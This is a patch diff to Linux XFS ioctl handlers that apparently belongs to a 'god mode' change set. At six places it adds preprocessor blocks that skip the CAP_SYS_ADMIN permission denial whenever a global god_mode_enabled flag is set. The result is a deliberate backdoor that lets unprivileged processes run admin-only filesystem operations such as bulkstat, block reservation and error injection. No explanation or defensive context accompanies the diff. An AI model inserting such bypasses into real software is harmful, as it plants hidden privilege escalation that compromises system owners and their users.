@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (c) 2000-2005 Silicon Graphics, Inc.
  * All Rights Reserved.
@@ -651,7 +654,15 @@ xfs_ioc_bulkstat(
 	/* should be called again (unused here, but used in dmapi) */
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (XFS_FORCED_SHUTDOWN(mp))
 		return -XFS_ERROR(EIO);
@@ -1452,7 +1463,15 @@ xfs_file_ioctl(
 		__uint64_t	   in;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (mp->m_flags & XFS_MOUNT_RDONLY)
 			return -XFS_ERROR(EROFS);
@@ -1475,7 +1494,15 @@ xfs_file_ioctl(
 		xfs_fsop_resblks_t out;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		error = xfs_reserve_blocks(mp, NULL, &out);
 		if (error)
@@ -1521,7 +1548,15 @@ xfs_file_ioctl(
 		__uint32_t in;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (get_user(in, (__uint32_t __user *)arg))
 			return -XFS_ERROR(EFAULT);
@@ -1534,7 +1569,15 @@ xfs_file_ioctl(
 		xfs_error_injection_t in;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (copy_from_user(&in, arg, sizeof(in)))
 			return -XFS_ERROR(EFAULT);
@@ -1545,7 +1588,15 @@ xfs_file_ioctl(
 
 	case XFS_IOC_ERROR_CLEARALL:
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		error = xfs_errortag_clearall(mp, 1);
 		return -error;
